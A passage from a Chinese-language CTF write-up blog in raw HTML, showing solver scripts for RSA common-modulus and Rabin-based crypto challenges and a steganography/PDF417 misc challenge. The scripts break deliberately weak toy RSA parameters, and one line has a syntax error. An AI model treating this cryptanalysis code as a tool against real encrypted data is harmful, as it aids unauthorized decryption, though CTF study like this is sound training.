class="number">21823306870841016169952481786862436752894840403702198056283357605213928505593301063582851595978932538906067287633295577036042158302374948726749348518563038266373826871950904733691046595387955703305846728530987885075910490362453202598654326947224392718573893241175123285569008519568745153449344966513636585290770127055273442962689462195231016899149101764299663284434805817339348868793709084130862028614587704503862805479792184019334567648078767418576316170976110991128933886639402771294997811025942544455255589081280244545901394681866421223066422484654301298662143648389546410087950190562132305368935595374543145047531</span></span><br><span class="line">c2 = <span class="number">9206260935066257829121388953665257330462733292786644374322218835580114859866206824679553444406457919107749074087554277542345820215439646770680403669560474462369400641865810922332023620699210211474208020801386285068698280364369889940167999918586298280468301097349599560130461998493342138792264005228209537462674085410740693861782834212336781821810115004115324470013999092462310414257990310781534056807393206155460371454836230410545171068506044174001172922614805135260670524852139187370335492876094059860576794839704978988507147972109411033377749446821374195721696073748745825273557964015532261000826958288349348269664</span></span><br><span class="line"></span><br><span class="line">s = egcd(e1, e2)</span><br><span class="line">s1 = s[<span class="number">1</span>]</span><br><span class="line">s2 = s[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s1&lt;<span class="number">0</span>:</span><br><span class="line">   s1 = - s1</span><br><span class="line">   c1 = modinv(c1, n)</span><br><span class="line"><span class="keyword">elif</span> s2&lt;<span class="number">0</span>:</span><br><span class="line">   s2 = - s2</span><br><span class="line">   c2 = modinv(c2, n)</span><br><span class="line">m=(pow(c1,s1,n)*pow(c2,s2,n)) % n</span><br><span class="line"><span class="keyword">print</span> (binascii.unhexlify(hex(m)[<span class="number">2</span>:].strip(<span class="string">"L"</span>)))</span><br></pre></td></tr></table></figure>
<p>关于RSA攻击的一些常见题目，可以参考<a href="https://xz.aliyun.com/t/6459" target="_blank" rel="noopener">这里</a>。</p>
<h2 id="Crypto-warm-up"><a href="#Crypto-warm-up" class="headerlink" title="Crypto-warm_up"></a>Crypto-warm_up</h2><p>一道RSA攻击题，比赛的时候用了很久的时间，结果方法是那个方法，也没毛病，但是拿到的中间解密结果就是跟正确的不一样…<br>【补充】后来得知是利用<a href="https://blog.csdn.net/jcbx_/article/details/101066670" target="_blank" rel="noopener">Rabin算法</a>来解密，</p>
<h3 id="题目分析-5"><a href="#题目分析-5" class="headerlink" title="题目分析"></a>题目分析</h3><p>首先拿到加密的脚本：<br><code>challenge</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> encode <span class="keyword">import</span> KEY</span><br><span class="line"></span><br><span class="line">q=getPrime(<span class="number">1024</span>)</span><br><span class="line">p=getPrime(<span class="number">1024</span>)</span><br><span class="line">r=getPrime(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">s=getPrime(<span class="number">1500</span>)</span><br><span class="line"></span><br><span class="line">e1=<span class="number">125794</span></span><br><span class="line">e2=<span class="number">42373</span></span><br><span class="line"></span><br><span class="line">n1=p*q</span><br><span class="line"><span class="comment"># p=131007115323263999345439921359227318254405259922548848874604821887442317315261280241204120172695148419556904875799765832598963733615261986846902786588239855657188269808050049322273049247577603319550134241252668567291670945189847048114844786099701880760746513002722191178146535455786553456997962473256126933599</span></span><br><span class="line"><span class="comment"># q=119483326784566375381311671166934261653966910443478433390480121272123328703673727110548386173243715369452830115984647613984491314122410531350348274710343333683717539768667655774410095306308786327548868489032433387156558717074449072976228756713826882644799579064381868958833899404263434981929880125095896045279</span></span><br><span class="line">n2=p*r</span><br><span class="line"><span class="comment"># r=125865800078882436358190150840086704132269782327092865891978833903435318406585569079365400123511664535093591726335541806103608520149741821723730509181335231384826827110615769921634583280405181533715780121294953290009221367811719652713563785099152724624248766800252106719691710099748709715428046927462566738829</span></span><br><span class="line">n3=p*q*s</span><br><span class="line"><span class="comment"># s=4381527556155456244163866461213062154975584084098516713465580696307104582336232806581070200178877144056318286852510416984171734722261473011812834553119204840984224160234243628578437239474676744592256886496775536777147355925487433224470975028941234194214177866322189418677266623335736030464485482684975053531544588046871751319647627210975030993527752551643707233557167595205555007238628961572027648064667065121254775370786901687256744800890945396435909316593963191272036460122138655751400930994411285603646950022989642830534704209469689551712512249174150742858665648252625354876868232433296490519493372739129388386546</span></span><br><span class="line">c1=pow(s,e1,n1)</span><br><span class="line">Key=int(KEY.encode(<span class="string">'hex'</span>),<span class="number">16</span>)</span><br><span class="line">key_encode=pow(Key,e2,n3)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"enc"</span>,<span class="string">"a"</span>)<span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">"c1: "</span>+str(c1)+<span class="string">"\n"</span>)</span><br><span class="line">    f.write(<span class="string">"n1: "</span>+str(n1)+<span class="string">"\n"</span>)</span><br><span class="line">    f.write(<span class="string">"n2: "</span>+str(n2)+<span class="string">"\n"</span>)</span><br><span class="line">    f.write(<span class="string">"key_encode: "</span>+str(key_encode)+<span class="string">"\n"</span>)</span><br></pre></td></tr></table></figure>
<p><code>encode</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">KEY = os.urandom(len(flag))</span><br><span class="line"></span><br><span class="line">dec=int(flag.encode(<span class="string">'hex'</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> len(bin(dec)[<span class="number">2</span>:])==<span class="number">335</span></span><br><span class="line">mask=int(<span class="string">'1'</span>*<span class="number">335</span>,<span class="number">2</span>)</span><br><span class="line">dec=(dec^dec&lt;&lt;<span class="number">200</span> )&amp;mask</span><br><span class="line">enc=dec^bytes_to_long(KEY)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"enc: "</span>+str(enc)</span><br><span class="line"></span><br><span class="line"><span class="comment">#enc: 17403902166198774030870481073653666694643312949888760770888896025597904503707411677223946079009696809</span></span><br></pre></td></tr></table></figure>
<p>审计代码可知，要拿到flag，我们首先需要拿到<code>KEY</code>，而<code>KEY</code>是经过RSA加密的。<br>但是观察RSA代码发现<code>n1</code>和<code>n2</code>有公约数<code>p</code>，利用欧几里何算法即可求得：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(m,n)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> n==<span class="number">0</span>:         <span class="comment">#考虑特殊情况</span></span><br><span class="line">        print(<span class="string">"n is not equal 0!"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">while</span> m%n!=<span class="number">0</span>:</span><br><span class="line">            new=m</span><br><span class="line">            m=n</span><br><span class="line">            n=new%n</span><br><span class="line">        <span class="keyword">return</span> n</span><br></pre></td></tr></table></figure>
<p>这样我们就有了<code>p</code>、<code>q</code>、<code>r</code>，但是要得到<code>KEY</code>，我们需要拿到<code>s</code>，这个地方参考了网上的<a href="https://www.anquanke.com/post/id/164575#h2-4" target="_blank" rel="noopener">一篇文章</a>中的一部分来求，但是求得的<code>s</code>不是<code>1500</code>bit、但是加密的密文却是一样的…然后也就没有做下去了，等WP吧…<br>后来一位师傅分享了自己的总结，学习下吧：<br><a href="http://www.soreatu.com/ctf/writeups/Writeup%20for%20Crypto%20problems%20in%20NCTF%202019.html#easyrsa" target="_blank" rel="noopener">http://www.soreatu.com/ctf/writeups/Writeup%20for%20Crypto%20problems%20in%20NCTF%202019.html#easyrsa</a><br>师傅给了他的脚本做参考，但是还没完全搞明白，等WP出来研究好了再补充。</p>
<h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p>利用<code>Rabin</code>算法解密RSA部分，然后利用运算的特性将<code>dec=(dec^dec&lt;&lt;200)&amp;mask</code>通过<code>dec=(dec^dec&gt;&gt;200)&amp;mask</code>进行还原，解密脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">c1 = <span class="number">9977992111543474765993146699435780943354123551515555639473990571150196059887059696672744669228084544909025528146255490100789992216506586730653100894938711107779449187833366325936098812758615334617812732956967746820046321447169099942918022803930068529359616171025439714650868454930763815035475473077689115645913895433110149735235210437428625515317444853803605457325117693750834579622201070329710209543724812590086065816764917135636424809464755834786301901125786342127636605411141721732886212695150911960225370999521213349980949049923324623683647865441245309856444824402766736069791224029707519660787841893575575974855</span></span><br><span class="line">n1 = <span class="number">15653165971272925436189715950306169488648677427569197436559321968692908786349053303839431043588260338317859397537409728729274630550454731306685369845739785958309492188309739135163206662322980634812713910231189563194520522299672424106135656125893413504868167774287157038801622413798125676071689173117885182987841510070517898710350608725809906704505037866925358298525340393278376093071591988997064894579887906638790394371193617375086245950012269822349986482584060745112453163774290976851732665573217485779016736517696391513031881133151033844438314444107440811148603369668944891577028184130587885396017194863581130429121</span></span><br><span class="line">n2 = <span class="number">16489315386189042325770722192051506427349661112741403036117573859132337429264884611622357211389605225298644036805277212706583007338311350354908188224017869204022357980160833603890106564921333757491827877881996534008550579568290954848163873756688735179943313218316121156169277347705100580489857710376956784845139492131491003087888548241338393764269176675849400130460962312511303071508724811323438930655022930044289801178261135747942804968069730574751117952892336466612936801767553879313788406195290612707141092629226262881229776085126595220954398177476898915921943956162959257866832266411559621885794764791161258015571</span></span><br><span class="line">key_encode = <span class="number">154190230043753146353030548481259824097315973300626635557077557377724792985967471051038771303021991128148382608945680808938022458604078361850131745923161785422897171143162106718751785423910619082539632583776061636384945874434750267946631953612827762111005810457361526448525422842867001928519321359911975591581818207635923763710541026422076426423704596685256919683190492684987278018502571910294876596243956361277398629634060304624160081587277143907713428490243383194813480543419579737033035126867092469545345710049931834620804229860730306833456574575819681754486527026055566414873480425894862255077897522535758341968447477137256183708467693039633376832871571997148048935811129126086180156680457571784113049835290351001647282189000382279868628184984112626304731043149626327230591704892805774286122197299007823500636066926273430033695532664238665904030038927362086521253828046061437563787421700166850374578569457126653311652359735584860062417872495590142553341805723610473288209629102401412355687033859617593346080141954959333922596227692493410939482451187988507415231993</span></span><br><span class="line">p = gmpy2.gcd(n1, n2)</span><br><span class="line">q = n1/p</span><br><span class="line">e1 = <span class="number">125794</span></span><br><span class="line">e2 = <span class="number">42373</span></span><br><span class="line">b = gmpy2.gcd(e1, (p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">bd = gmpy2.invert(e1/b, (p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">s = pow(c1, bd, n1)</span><br><span class="line"></span><br><span class="line">u = pow(s,(p+<span class="number">1</span>)/<span class="number">4</span>,p)</span><br><span class="line">v = pow(s,(q+<span class="number">1</span>)/<span class="number">4</span>,q)</span><br><span class="line">s = gmpy2.invert(p,q)</span><br><span class="line">t = gmpy2.invert(q,p)</span><br><span class="line">x = (t*q*u+s*p*v)%n1</span><br><span class="line">x2 = -x%n1</span><br><span class="line">y = (t*q*u-s*p*v)%n1</span><br><span class="line">y2 = -y%n1</span><br><span class="line">might_s = [x, x2, y, y2]</span><br><span class="line">might_d = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> might_s:</span><br><span class="line">    might_d.append(int(gmpy2.invert(e2, (p<span class="number">-1</span>)*(q<span class="number">-1</span>)*(i<span class="number">-1</span>))))</span><br><span class="line"></span><br><span class="line">might_key = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">    might_key.append(pow(key_encode, might_d[i], p*q*might_s[i])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">enc = <span class="number">17403902166198774030870481073653666694643312949888760770888896025597904503707411677223946079009696809</span></span><br><span class="line">key = <span class="number">42580132829749909635949545500710961386423741815111173311539127124848530560526050611168224706289064276</span></span><br><span class="line">dec = key^enc</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(dec)</span><br><span class="line">mask = int(<span class="string">'1'</span>*<span class="number">335</span>,<span class="number">2</span>)</span><br><span class="line">dec = (dec ^ dec&gt;&gt;<span class="number">200</span>)&amp;mask</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(dec)</span><br></pre></td></tr></table></figure>

<h2 id="Misc-code-in-morse"><a href="#Misc-code-in-morse" class="headerlink" title="Misc-code_in_morse"></a>Misc-code_in_morse</h2><p>考察基本的流量分析、morse编码，base32解码转图片，PDF417图片的识别以及F5隐写。</p>
<h3 id="题目分析-6"><a href="#题目分析-6" class="headerlink" title="题目分析"></a>题目分析</h3><p>拿到流量包之后导出<code>HTTP</code>数据，发现一共四个文件，在<code>PNG</code>文件中拿到了morse码，到网站解码得到一串base32码，这个时候到网站上解base32解不出来，就用python解了一下，发现是一堆hex，其中还有<code>PNG</code>字样，断定是图片的数据，写了个脚本导入到<code>png</code>图片：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">b32 = <span class="string">"RFIE4RYNBINAUAAAAAGUSSCEKIAAAAEUAAAAA7AIAYAAAAEPFOMTWAAABANUSRCBKR4F53M52F3NWOAMIQ37776R5GE6YNAWJPUA4ZBZM6M5ZPRVWIURUHGMBRAMU7T3P57X776PP5DOBIQIXQE2RCZC5EYFWBAESRALQNACALVNE4B2TCABEA4XIZQAVKFXW632O3XS5HZT7R2J747545E4Y7K6HJA7WI5Y62W4OH7HJ75RL2VOMUMN2OOXOWU7RXV7U6D7AFC2X6TBGSDQII3ABOUCCARS2Q7CAATKD2HRTI6JKAZNIXYGK3ZO4POZENG566RDQVSAKWF26VLJJPC5VD2FAATKAMCHTP27Y5IKTWNNAKLVNEPUXLH6XVICOQMXGHEPDBYZYXZ2R6KKTU7ZF7X2CBGUXSOSHICOPIPQCJNAT3JO5ND5OHLBW5BF4CWNI5BFKTERWIUWFZYKVVKURWS7PI4FEXURAUFXBD6JQKSPZFJ7EXRCPEUSHJMS7GVKVDOG7W6F4ZL4XILUVCKWGFZ3KV2I5WBR7R2QALVHNSEWCKDCIXCA3VJU2QAJVCUZSO3LZICZJAASKAD2LKQ6BLVPQLUDSDLFPZP2WOTPLVLNABG7SPICMT3K52QLTWK3Y4NBXIMX5NRKJIA5FLO6Y3LVP55BPDITRVN2UYEZ33ERFZ2R4KTFVJVECKKRXKA2LRCKQFHEAIEAKZWYCKXRXLGJYJXQKZ445HWLUPAFGIC7FV46SB5MERIYNWSHUCNUQP5OB4S2BDQ7627HULZQRW3QYNKQKU3VHCNJSU6E36IUEPU2TBGKZOSB22N2R6TPY7XUG32VIXLTHGHJXGWNWMTJOGFMAJHOVWIIGDSG2KOONGK7UDFQS4ZOK2OAXKAXWZRTOTZQ2Q7CKRKRWAK6IAK2SRYLT72DGHQXRJGGDN57EJBZ2M7VJHOGJKEHU5ASU2KKTFB4SW5MB5C4YR4SSKNON3XLSS6K7CGJKAZNIP6E7RVUY6OFIBTTXYREMWKWPIDKRPTJSMRJPUXKUOWT5IZP3HEJ65OYVILIUGUI2QHGH32VAAXKO23H2BTIAF2UF4QESSANVEKPILOY63ZA5GUZRLLCIQSY6IRWLSTWULC5KBRAFOQPPEED3VB6IKKDRSN2FF4UVXS7KT6TUQCRQZ2DXZS5AYOCLLHKK6I2JUPRSK2HVI3YKBTZXWQDNGI3FMYHFMO3BIYABKUPTFSK3J4KKPKNALUMP5NFERHUB3I7IWTXQEAAMQUPQGRADFFIMKQ3MQNX3BW7NU4WMITZDB5D3FP3VHD2SPCX65ZVL44VUHQMAHMZLQFKADBFIO2RRKTCDYZJ2BCENKZ2LY2TIKSH3MMU3EUB5T26E4TP4NK3F6KRSTI3TEKTBKXTJYKHQATMWUDXT5T4CUYXK6U5H2LYAKUO5LJIFS2QY4O7KZP3KBCODRBAGLKPDN5WUTLOAKEOJP22CBGU6GXYJUPRTXXHKJLP7D46I2TPFLWQRJ4NIEFDYSNKDYFCERFHAC5NIWXVQXELIUSGKLKZLGT36JMOS7IIPBU76KXNQDJV4ZSXCE7F5P4U4QIRAKPAWRQFJLVHRFJDKIVLAVFOORM7F5S3U5D6AIFDV27JYJ243PIM6UKVSGLKQIZACNKPHVJAQJNPUAWACJNAWYEJBR2Q6LTA3STOLSLO6QZFKQ5QGFEZ5TKCJJ6VKBVNVO7DKG27T3HHJDRVXTPD6H7EW6FI6QB5GHQVKU3VP54TBBQMIDFJ6QFKRZXP4UE2QG3EVJDK3AASKBCE5W3VDHVB4JVC7IXOG5C7J4MZWSRDJFSHKH626LIUGRPZ6T2SEANVP5KDXFNKGQIWQS5J5MC5HBH5GGTHZLGWXKOWSCRQNULFGO4C3ZHUZF6O57K4YV2VYUR5BF3PDMEKR7JZEZJAAEUUORJ32GSHIAG4OWQS5LPPKVU2J7P5AQUQWRK7HE5BX3UWXJNPSKKBICC5Z5Y5L7AESSANUYPUNR2USESHE2ORQMJ5H6KTB6YSTVZD3FA6NLBUASWRM6VZYTXV6E4J6SW2XLZ6RGW7JL5FECJ53N7KRKRXMJGKVJTH6FNIFIOOA26AFHEAXJCUAQGBON2UPZNMBRKW7ZKUDZFYMCQBE5B4SUCTJ6TIOOT6J2XVXXLVRMPT3VGQUCSIAU4DKFJ7535XXUWGDSV3DJHQ2SXK3PILDELUPQVAVKFKJQM2GO47WTXXIZQPKNAE2VSDIDGT2VSSNUFSQAJV7WEY2WKVFSQANMFERVARSSUGEJ7TZLISVGYVPGPSVZTRTRYZXVI6VNNIZ6LFNPL2VAQVECPVZYLF3BR2M2PCXAF5USD6UVR7STM27OSOM7D3XUU2RZD5KWOKSBKIKLW3Q6VCIJTFVJLQDBREGECQBDKTJETLKU5KYQJVABNCATKD4MCVP6G75HT2V4CPQSW64SMM2VIBS2Q65ENEIBIETVJ5MFEFVLPEZXG3JEXX4QXSSUAABGMN67M5CJJVGTWUOS7742UGJK6VG2TGVFVCIYCUE2L44E2VBFJHTFNT7URWE6HSIZ2PF5TR7QST3FEAXIWSCMJO4V74VEACNKEGJF3B2IDGRF3BRAYWTALFVCFR7IZCNGVDEUSAZURUGABG5H6TDDKNEVH4TWZC2DI6FR6XT6W64SDC2JY3WDEXTLOK4ZBKPEXZMPFC4RFCFU5KQ6AEDV6T2MGAJ7HUQQUXSPY2U6VFNR3YDVWWKLK54UE2RPPUBGUJHDZ5SGMUY563JFZIRAPIXIGHLD2Q5IMUQOWIGOS2OADI4FPZ3GPJHQV2BU74SW6AUSPXX57VPJ24ZFJ7FNQIURSX6KQZGLKPDN5TLRKZZEGEN6K7T65EHP2X7E54M4AZQVRPFHRVDOZBLVAJFSHUPIVMTKKFUF4C2X7FBGUNWESTWFYXM37PZIBXQMWUERWUSQTFVD65OZR7YZBUACNIP46K3EQXWY5SUSIYGESUH3NLI6FI6DAFNUHQD5KLADK23QWSXWV4UE2RTF6HNMZWTVLVVZMN6NGKXOPO7AKI7ZO2AYBGV7YFMMCAQKQ65D6VINJOPMPKVO3XS73ICKETFERWLKCFX5YEYQA566QZJPETH7AKRZBJPENQNUWN4K2DYTNLWDKPY2WKGMDCIC5QRQUSO42ZPETOUO3VHUIJSVHSN3UXZ2B6OR6ZYB2J4KX5W6QRKB5QMEKQQVTTVO2LJYMULY2WDFFQWROXMWUELDVPZBIDFVAWQFLR6AJ6POOEHBW2U4UDC7S2FRU4VC47P3WQJ4BROGKLYQXSVIHLE7ZXAIKID2LZFB5JHV4NIAKQCAJFGYXI3AEAXI2JYDRGUDCMBJIR7ABXO3NF6UIUKCLNAAAAAACJIVHEJLSCMCBA===="</span></span><br><span class="line">hex = base64.b32decode(b32)</span><br><span class="line">print(hex)</span><br><span class="line">f1 = open(<span class="string">"1.png"</span>,<span class="string">'wb'</span>)</span><br><span class="line">f1.write(hex)</span><br><span class="line">f1.close()</span><br></pre></td></tr></table></figure>
<p>然后拿到了如下一张图：<br><img src="http://www.ggb0n.cool/images/ichunqiu23.png" alt=""><br>后来得知是<code>PDF417</code>，然后到网上找了一下扫描的方法，<a href="https://online-barcode-reader.inliteresearch.com/" target="_blank" rel="noopener">这里</a>和<a href="https://demo.dynamsoft.com/DBR/BarcodeReaderDemo.aspx" target="_blank" rel="noopener">这里</a>都可以识别，识别出了下面这个图：<br><img src="http://www.ggb0n.cool/images/ichunqiu24.jpg" alt=""><br>这里卡了好久，要不是就拿到了二血了…<br>后来看到图片的标题<code>F5</code>得知是<code>F5</code>隐写，然后用<a href="https://github.com/matthewgao/F5-steganography" target="_blank" rel="noopener">F5-steganography</a>跑出了flag。<br><img src="http://www.ggb0n.cool/images/ichunqiu1.png" alt=""></p>
<p>这里偶然间发现了一个更好用的工具，输入morse码就直接出了PDF417的图，分享一下：<a href="https://gchq.github.io/CyberChef/" target="_blank" rel="noopener">CyberChef</a>，只能说，师傅们tql!</p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">ggb0n</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://ggb0n.cool/2020/02/21/ichunqiu%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E8%B5%9B-WriteUp/">http://ggb0n.cool/2020/02/21/ichunqiu%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB%E8%B5%9B-WriteUp/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a><a class="post-meta__tags" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">反序列化漏洞</a><a class="post-meta__tags" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E/">反序列化逃逸漏洞</a><a class="post-meta__tags" href="/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/">堆叠注入</a><a class="post-meta__tags" href="/tags/SSTI/">SSTI</a><a class="post-meta__tags" href="/tags/RSA%E6%94%BB%E5%87%BB/">RSA攻击</a><a class="post-meta__tags" href="/tags/bypass-functions-disable/">bypass functions_disable</a><a class="post-meta__tags" href="/tags/RSA%E5%85%B1%E6%A8%A1%E6%94%BB%E5%87%BB/">RSA共模攻击</a><a class="post-meta__tags" href="/tags/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/">时间盲注</a><a class="post-meta__tags" href="/tags/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/">宽字节注入</a><a class="post-meta__tags" href="/tags/%E5%88%A9%E7%94%A8%E6%AD%A3%E5%88%99%E6%B3%A8%E5%85%A5/">利用正则注入</a><a class="post-meta__tags" href="/tags/%E5%88%A9%E7%94%A8Handler%E6%B3%A8%E5%85%A5/">利用Handler注入</a><a class="post-meta__tags" href="/tags/%E5%88%A9%E7%94%A8%E9%A2%84%E5%A4%84%E7%90%86%E8%AF%AD%E5%8F%A5%E8%BF%9B%E8%A1%8C%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/">利用预处理语句进行堆叠注入</a><a class="post-meta__tags" href="/tags/%E5%A4%9A%E5%88%97%E6%95%B0%E6%8D%AE%E7%88%86%E7%A0%B4%E6%B3%A8%E5%85%A5/">多列数据爆破注入</a><a class="post-meta__tags" href="/tags/PDF417%E8%AF%86%E5%88%AB/">PDF417识别</a><a class="post-meta__tags" href="/tags/F5%E9%9A%90%E5%86%99/">F5隐写</a><a class="post-meta__tags" href="/tags/ThinkPHP6-0-%E9%80%9A%E8%BF%87SEESION%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E/">ThinkPHP6.0-通过SEESION写文件漏洞</a><a class="post-meta__tags" href="/tags/Rabin%E7%AE%97%E6%B3%95%E6%94%BB%E5%87%BB/">Rabin算法攻击</a></div><div class="social-share pull-right" data-disabled="douban,diandian,google,linkedin,v.t.qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script><nav id="pagination"><div class="prev-post pull-left"><a href="/2020/02/26/%E5%AE%89%E6%81%92-%E6%8A%97%E7%96%AB%E6%9C%88%E8%B5%9B/"><i class="fa fa-chevron-left">  </i><span>安恒-抗疫月赛</span></a></div><div class="next-post pull-right"><a href="/2020/02/18/BSidesSF2019-WriteUp/"><span>BSidesSF2019-WriteUp</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2020 by ggb0n</div><div class="footer_custom_text">一生一世，爱你一人。</div><div class="icp"><a href="http://www.beian.miit.gov.cn/" target="_blank" rel="noopener"><span>豫ICP备20003023号</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.7.0"></script><script src="/js/fancybox.js?version=1.7.0"></script><script src="/js/sidebar.js?version=1.7.0"></script><script src="/js/copy.js?version=1.7.0"></script><script src="/js/fireworks.js?version=1.7.0"></script><script src="/js/transition.js?version=1.7.0"></script><script src="/js/scroll.js?version=1.7.0"></script><script src="/js/head.js?version=1.7.0"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>Powered by</span> <a href="https://github.com/wzpan/hexo-generator-search" target="_blank" rel="noopener" style="color:#49B1F5;">hexo-generator-search</a></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div></body></html>